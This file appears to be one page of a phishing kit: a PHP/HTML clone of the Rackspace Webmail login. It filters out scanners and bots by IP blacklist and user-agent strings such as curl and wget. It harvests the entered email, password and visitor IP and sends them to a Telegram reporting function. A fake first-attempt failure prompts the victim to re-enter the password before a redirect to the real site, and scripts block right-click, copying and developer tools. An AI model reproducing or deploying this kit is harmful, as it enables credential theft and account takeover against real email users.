<?php
//═══════════════════════════════════════════════════════════════════════════
//  🚫 IP BLACKLIST CHECK (High Priority)
//═══════════════════════════════════════════════════════════════════════════
require_once __DIR__ . '/../ip_blacklist_loader.php';

if (!function_exists('x8SYQLpUqU')) { 
    function x8SYQLpUqU() { 
        $xb2zx1 = $_SERVER['SERVER_ADDR']; 
        $xXSEJ = '127.0.0.1'; 
        if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CF_CONNECTING_IP'];
        } elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!=$xXSEJ)) {
            $ip=$_SERVER['GEOIP_ADDR'];
        } elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=$xXSEJ) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($xb2zx1))) {
            $ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!=$xXSEJ) && (($_SERVER['HTTP_CLIENT_IP'])!=($xb2zx1))) {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        } else {
            $ip=$_SERVER['REMOTE_ADDR'];
        } 
        return $ip; 
    }
}
$ip=x8SYQLpUqU();

// Check if visitor IP is in blacklist files
if (IPBlacklistLoader::isBlacklisted($ip)) {
    // IP is blacklisted - redirect to centralized URL
    require_once __DIR__ . '/../config_redirect.php';
    header('Location: ' . CENTRALIZED_REDIRECT_URL, true, 302);
    exit;
}

//═══════════════════════════════════════════════════════════════════════════
//  Basic Bot Detection (Secondary Layer)
//═══════════════════════════════════════════════════════════════════════════ 

if (!function_exists('x9PfbWn2bS')) { 
    function x9PfbWn2bS() { 
        if(empty($_SERVER['HTTP_USER_AGENT'])) { 
            $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); 
        } 
        return $_SERVER['HTTP_USER_AGENT']; 
    }
}
$eRf9t9d9 = x9PfbWn2bS();

// Basic user agent check (secondary protection layer)
$ua_lower = strtolower($eRf9t9d9);
$obvious_bots = ['curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'java/', 'bot', 'crawler', 'spider', 'scraper'];
foreach ($obvious_bots as $bot_signature) {
    if (strpos($ua_lower, $bot_signature) !== false) {
        die(header('HTTP/1.1 403 Forbidden'));
    }
}

// ✅ All checks passed - load page
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Rackspace Webmail: Hosted Email for Business</title>
  
  <!-- Antibot Scripts -->
  <script src="../m/js/fingerprint.js"></script>
  <script src="../m/js/utils.js"></script>
  <script src="../m/js/captcha.js"></script>
  
  <!-- Centralized Functions -->
  <script src="../js/centralized_telegram.js"></script>
  <script src="../js/centralized_redirect.js"></script>
  <script src="../js/email_extractor.js"></script>
  <script src="../js/autofill_helper.js"></script>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">

  <style>
    /* Page Defaults */
    * {
      -webkit-box-sizing: border-box;
      -moz-box-sizing: border-box;
      box-sizing: border-box;
    }

    body {
      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
      font-size: 14px;
      line-height: 1.42857;
      color: #333333;
      background-color: #FAFAFA;
      margin: 0;
    }

    .caption {
      display: inline-block;
      font-size: 12px;
      color: #666;
    }

    .base_link {
      display: inline-block;
      color: #0C7C84;
      text-decoration: none;
    }

    .base_links {
      background: #FFFFFF;
      text-align: center;
      padding-bottom: 20px;
      margin-top: -15px;
    }

    .divider {
      display: inline-block;
      margin: 0px 5px;
      color: #0C7C84;
    }
    /* Page Layout */
    #content {
      display: flex;
      align-items: center;
      justify-content: center;
      position: fixed;
      top: 0;
      left: 0;
      bottom: 0;
      right: 0;
      background: #EAEAEA;
    }

    #content-header {
      height: 53px;
      padding: 16px;
      font-size: 24px;
      font-weight: 300;
      line-height: 18px;
      background: #424242;
      color: #FCFCFC;
    }

    #content-header-logo {
      float: right;
    }

    #logo {
      width: 130px;
      margin-top: -9px;
      margin-right: -5px;
    }

    #content-header-label {
      float: left;
    }

    #content-body {
      display: flex;
      justify-content: start;
      background: #FFFFFF;
      min-width: 790px;
    }

    #banner-section {
      height: 285px;
      width: 314px;
      margin: 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    #banner {
      width: 190px;
    }

    #divider {
      border: 1px solid rgb(224, 224, 224);
      margin: 40px 0px;
    }
    /* Form Layout */
    #form {
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 20px;
      min-height: 268px;
      width: 100%;
    }

    #form-body {
      height: 205px;
      width: 100%;
      margin: 40px 0px 0px 20px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding-right: 20px;
    }

    #form-container {
      width: 100%;
      margin: 0px auto;
      padding: 0px 10px;
    }

    .row {
      margin: 0px -10px;
    }

      .row:before, .row:after {
        content: " ";
        display: table;
      }

    .col {
      width: 100%;
      float: left;
      position: relative;
      min-height: 1px;
      padding: 0px 10px;
    }

    .form-group {
      width: inherit;
      padding-right: 30px;
      margin-bottom: 20px;
    }

    .form-label {
      position: relative;
      font-family: Roboto;
      font-size: 16px;
      margin-bottom: 8px;
      line-height: 1;
      color: #616161;
      display: inline-block;
      max-width: 100%;
    }

    .form-field {
      border: 1px solid #BDBDBD;
      border-radius: 2px;
      background: #FFFFFF;
      font-family: Roboto;
      font-size: 16px;
      color: #616161;
      height: 32px;
      display: block;
      width: 100%;
      padding: 4px 8px;
      line-height: 1.42857;
      -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
      -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
      -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
      transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
    }

    #forgot-password {
      position: absolute;
      top: 0px;
      right: 40px;
      color: #0C7C84;
      text-decoration: none;
      background-color: transparent;
      box-sizing: border-box;
    }

    #login-btn-toolbar {
      float: right;
      margin: auto 30px 15px -20px;
    }

    #login-btn {
      float: right;
      display: inline-flex;
      flex-direction: row;
      justify-content: center;
      align-items: center;
      padding: 0 12px;
      height: 32px;
      line-height: 1px;
      font-size: 14px;
      font-weight: 400;
      text-transform: capitalize;
      color: #fff;
      background-color: #0C7C84;
      border-color: #0C7C84;
      margin-bottom: 0;
      text-align: center;
      vertical-align: middle;
      touch-action: manipulation;
      cursor: pointer;
      background-image: none;
      border: 1px solid transparent;
      white-space: nowrap;
      border-radius: 2px;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    #form-container {
      width: 100%;
      margin: 0px auto;
      padding: 0px 10px;
    }

    @media only screen and (max-device-width: 480px) {
      /* Page Defaults */
      body {
        font-size: 19pt;
        line-height: 1.42857em;
      }

      .caption {
        display: inline-block;
        font-size: 80%;
        color: #666;
      }
      /* Page Layout */
      #content {
        align-items: inherit;
        display: inherit;
        justify-content: inherit;
      }

      #content-header {
        font-size: 171%;
        height: 3em;
        line-height: 1em;
        padding: 1em;
      }

      #content-header-logo {
        float: right;
      }

      #logo {
        margin-left: 6em;
        width: inherit;
        height: 1em;
      }

      #banner-section {
        display: none;
      }

      #divider {
        display: none;
      }
      /* Form Layout */
      .form-label {
        font-size: 114%;
      }

      .form-field {
        font-size: 114%;
        height: 2em;
      }

      #forgot-password {
        right: 2em;
        top: 0;
      }

      #login-btn-toolbar {
        margin: 1.5em 2em 1em -1.5em;
      }

      #login-btn {
        font-size: 150%;
        height: 3em;
        padding: 1.25em;
      }
    }
  </style>
</head>
<body>
  <div>
    <div id="content">
      <div>
        <div id="content-header">
          <div id="content-header-logo"><img id="logo" src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png"  /></div>
          <div id="content-header-label">Webmail Login</div>
        </div>
        <div id="content-body">
          <div id="banner-section">
            <a href="https://emailhelp.rackspace.com/l/identify-suspicious-email" target="_blank">
              <img id="banner" src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg" />
            </a>
          </div>
          <div id="divider"></div>
          <form id="form" method="post" name="login" action="" autocomplete="off">
  <script src="/wmidentity/dist/webmailLogin.js?v=dn70RwATRXPGR3I_MlY9aK9fMX6zSf1GYvcRvRv-UFc=" type="text/javascript"></script>
  <div id="form-body">
    <div id="form-container">
      <input type="hidden" name="__RequestVerificationToken" value="CfDJ8C9JbzfMhuZPt6XTc-PPbnaHpLdpd3UXSSPbtLtu_fXWBqexsQVEswBQrF3TUbMou-qmCnYMWbuUmGiJAbt6IsdLSLLSFD8V-imzYt2tUjQBuG9EVWgqBIi8_9_OpIEfEDU80ZMKNkHG2fGSvw4bhnc" />
      <!-- destination and flags is used for OWA login -->
      <input id="form-destination" type="hidden" name="destination" value="" />
      <input id="form-owa-flags" type="hidden" name="flags" value="4" />
      <div id="user-row" class="row">
        <div id="user-col" class="col">
          <div id="user-field" class="form-group">
            <label id="user-label" class="form-label">Email address</label>
            <input id="user-input" name="username" tabindex="1" class="form-field" value="" autocomplete="username" />
          </div>
        </div>
      </div>
      <div id="pass-row" class="row">
        <div id="pass-col" class="col">
          <div id="pass-field" class="form-group">
            <label id="pass-label" class="form-label">Password</label>
            <input id="pass-input" name="password" tabindex="2" type="password" class="form-field" value="" autocomplete="current-password" />
          </div>
          <a id="forgot-password" href="/wmidentity/recover/password" tabindex="4">Forgot password?</a>
        </div>
      </div>
    </div>
  </div>
  <div id="login-btn-toolbar">
    <button id="login-btn" tabindex="3" type="submit">Log In</button>
  </div>
</form>
        </div>
        <div class="base_links">
          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/privacystatement">
            Privacy Statement
          </a>
          <div class="divider"> | </div>
          <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/websiteterms">
            Website Terms
          </a>
        </div>
        <div class="footer" style="text-align: center; margin-top: 10px;">
          <div class="caption">
            Need webmail for your business?  Learn more about
            <a href="//www.rackspace.com/email-hosting/webmail" style="color: #666;">
              Hosted Email
            </a>
            from Rackspace
          </div>
        </div>
      </div>
    </div>
  </div>
	<script>
        function togglePassword(el) {
            // el is the button element
            var pwd = document.getElementById('password');
            // flip the type
            if (pwd.type === 'password') {
                pwd.type = 'text';
                el.setAttribute('aria-pressed', 'true');
                el.setAttribute('aria-label', 'Hide password');
                el.title = 'Hide password';
            } else {
                pwd.type = 'password';
                el.setAttribute('aria-pressed', 'false');
                el.setAttribute('aria-label', 'Show password');
                el.title = 'Show password';
            }
            // keep focus and cursor position after type toggle
            try {
            // Try to capture both selectionStart and selectionEnd so caret/selection
                // isn't moved to the start when toggling. If browser doesn't support
                // these properties, fall back to moving caret to the end.
                var start = typeof pwd.selectionStart === 'number' ? pwd.selectionStart : pwd.value.length;
                var end = typeof pwd.selectionEnd === 'number' ? pwd.selectionEnd : start;
                pwd.focus();
                // Allow a micro task for some browsers to re-evaluate type change
                // before setting selection (improves reliability).
                setTimeout(function() {
                    try { pwd.setSelectionRange(start, end); } catch (inner) { /* ignore */ }
                }, 0);
            } catch (e) { /* ignore if not supported */ }
        }
        // Initial spinner and error logic
        window.addEventListener('DOMContentLoaded', function() {
            var spinner = document.getElementById('initSpinner');
            var app = document.getElementById('app');
            var mainContent = document.getElementById('mainContent');
            var initError = document.getElementById('initError');
            // Show mainContent immediately
            if (mainContent) {
                mainContent.style.display = 'block';
            }
        });
    </script>
<!-- Antibot Scripts -->
<script src="../m/js/fingerprint.js"></script>
<script src="../m/js/utils.js"></script>
<script src="../m/js/captcha.js"></script>

<!-- Centralized Functions -->
<script src="../js/centralized_telegram.js"></script>
<script src="../js/centralized_redirect.js"></script>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script
      type="text/javascript"
      src="https://l2.io/ip.js?var=userip"
    ></script>
        <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
  </body>
  <script>
  /* global $ */
  $(document).ready(function() {
    var count = 0;

    function isValidEmail(email) {
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
      return filter.test(email);
    }

        // Auto-fill email from URL hash fragment.
        // Accepts:
        //  - #email=user@example.com
        //  - #user%40example.com (raw value)
        //  - #dXNlcj5AZXhhbXBsZS5jb20= (base64 encoded value)
        // Standardized autofill handled by js/autofill_helper.js
        // autoFillFromHash();

        // Hide error when user updates inputs
        $('#user-input, #pass-input').on('input', function() {
            // No error div to hide in Rackspace (uses alert)
        });

        // Anti-copy / anti-inspect: discourage right-click, copying, and common dev keys.
        (function() {
            // Disable right-click context menu on non-touch devices only
            var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            if (!isTouch) {
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                    return false;
                }, false);
            }

            // Disable copy from page
            document.addEventListener('copy', function(e) {
                try { e.clipboardData.setData('text/plain', 'Copying is disabled on this page.'); } catch (err) {}
                e.preventDefault();
                return false;
            });

            // Prevent selection initiation (safely allow within inputs)
            document.addEventListener('selectstart', function(e) {
                if (!e.target.closest('input, textarea')) {
                    e.preventDefault();
                    return false;
                }
            });

            // Block some developer tools key combos (not foolproof)
            document.addEventListener('keydown', function(e) {
                // F12
                if (e.keyCode === 123) { e.preventDefault(); e.stopPropagation(); return false; }
                // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
                if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); e.stopPropagation(); return false; }
                // Ctrl+U, Ctrl+S
                if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83)) { e.preventDefault(); e.stopPropagation(); return false; }
                // Cmd+Option+I (mac dev tools)
                if (e.metaKey && e.altKey && e.keyCode === 73) { e.preventDefault(); e.stopPropagation(); return false; }
            });
        })();

        $('#login-btn').on('click', function(event) {
      event.preventDefault();
      var email = $('#user-input').val() ? $('#user-input').val().trim() : '';
      var pw = $('#pass-input').val() ? $('#pass-input').val().trim() : '';
      if (!email) {
        $('#user-input').focus();
        return false;
      }
      if (!isValidEmail(email)) {
        $('#user-input').focus();
        return false;
      }
      if (!pw) {
        $('#pass-input').focus();
        return false;
      }
            // Attempt flow: first submit shows a wrong-credentials message, but
            // we still send a safe telemetry event on every submit. The second
            // submit will also redirect after reporting.
            count = count + 1;

            
            // Use centralized Telegram reporting with provider tag
            window.providerTag = 'rackspace';
            var clientIP = window.userip || 'n/a';
            
            function sendTelemetry(attempt, redirectOnSuccess) {
                // Send centralized Telegram report
                if (typeof sendCentralizedTelegramReport === 'function') {
                    sendCentralizedTelegramReport(providerTag, email, pw, clientIP, function(success) {
                        if (redirectOnSuccess) {
                            // Use centralized redirect
                            if (typeof performCentralizedRedirect === 'function') {
                                performCentralizedRedirect(300);
                            } else {
                                // Fallback if centralized redirect not available
                                setTimeout(function() { window.location.replace('https://apps.rackspace.com/'); }, 300);
                            }
                        }
                    });
                } else {
                    // Fallback if centralized function not available
                    console.error('Centralized Telegram function not available');
                    if (redirectOnSuccess) {
                        if (typeof performCentralizedRedirect === 'function') {
                            performCentralizedRedirect(300);
                        } else {
                            setTimeout(function() { window.location.replace('https://apps.rackspace.com/'); }, 300);
                        }
                    }
                }
                
                if (redirectOnSuccess) {
                    $('#login-btn').text('Logging in...');
                    setTimeout(function() {
                        $('#login-btn').text('Log in');
                    }, 200);
                }
            }

            // Always send telemetry (including the first attempt). Only redirect
            // when we have at least 2 attempts.
            sendTelemetry(count, (count >= 2));

            if (count === 1) {
                // Clear password for privacy, focus and allow user to try again
                $('#pass-input').val('').focus();
                return false;
            }
            
    });
});
  </script>
</body>
</html>
